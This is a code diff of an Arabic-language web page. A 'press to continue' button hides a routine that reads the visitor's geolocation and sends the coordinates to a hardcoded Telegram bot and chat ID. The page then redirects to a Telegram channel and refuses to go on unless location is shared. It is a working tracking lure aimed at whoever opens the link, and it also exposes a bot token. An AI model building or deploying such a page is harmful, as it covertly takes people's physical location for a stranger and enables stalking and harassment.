@@ -6,6 +6,7 @@
   <style>
     body {
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
       height: 100vh;
@@ -16,8 +17,25 @@
       font-family: Arial, sans-serif;
       color: #ffffff;
       direction: rtl;
-      overflow: hidden;
     }
+
+    #startBtn {
+      padding: 12px 24px;
+      font-size: 18px;
+      font-weight: bold;
+      background-color: rgba(0, 0, 0, 0.6);
+      border: 2px solid #ffffffaa;
+      border-radius: 12px;
+      color: white;
+      cursor: pointer;
+      margin-bottom: 30px;
+      transition: all 0.3s;
+    }
+
+    #startBtn:hover {
+      background-color: rgba(255, 255, 255, 0.2);
+    }
+
     #countdown {
       width: 80px;
       height: 80px;
@@ -30,68 +48,64 @@
       justify-content: center;
       align-items: center;
       text-shadow: 0 0 5px #000000;
-      transition: background-color 0.3s ease;
-    }
-    #countdown.done {
-      background: #00ff99;
-      border-color: #00cc77;
-      color: #004422;
-      box-shadow: 0 0 20px #00ff99aa;
-      text-shadow: none;
+      display: none;
     }
   </style>
 </head>
 <body>
+  <button id="startBtn">اضغط للمتابعة</button>
   <div id="countdown">5</div>
 
   <script>
     const BOT_TOKEN = "7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ";
     const CHAT_ID = "6028485445";
     const REDIRECT_URL = "https://t.me/sswq22";
-
-    let seconds = 5;
     let locationSent = false;
 
-    function getLocationAndSend() {
+    document.getElementById("startBtn").onclick = () => {
+      getLocationAndStart();
+    };
+
+    function getLocationAndStart() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((position) => {
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
+
           fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`)
-            .then(() => locationSent = true)
-            .catch(() => locationSent = false);
+            .then(() => {
+              locationSent = true;
+              startCountdown();
+            })
+            .catch(() => alert("فشل في إرسال الموقع"));
         }, () => {
-          locationSent = false;
-          alert("تم رفض إذن الموقع.");
+          alert("يرجى تفعيل الموقع للاستمرار.");
         });
       } else {
-        alert("المتصفح لا يدعم تحديد الموقع.");
+        alert("متصفحك لا يدعم مشاركة الموقع.");
       }
     }
 
     function startCountdown() {
+      document.getElementById("startBtn").style.display = "none";
       const countdownEl = document.getElementById("countdown");
+      countdownEl.style.display = "flex";
+      let seconds = 5;
       countdownEl.innerText = seconds;
+
       const interval = setInterval(() => {
         seconds--;
         countdownEl.innerText = seconds;
         if (seconds === 0) {
           clearInterval(interval);
           if (locationSent) {
-            countdownEl.classList.add('done');
-            countdownEl.innerText = "✔";
-            setTimeout(() => window.location.href = REDIRECT_URL, 800);
+            window.location.href = REDIRECT_URL;
           } else {
-            alert("يرجى الموافقة على مشاركة الموقع أولاً.");
+            alert("لم يتم إرسال الموقع، لا يمكن المتابعة.");
           }
         }
       }, 1000);
     }
-
-    window.onload = () => {
-      getLocationAndSend();
-      startCountdown();
-    };
   </script>
 </body>
 </html>
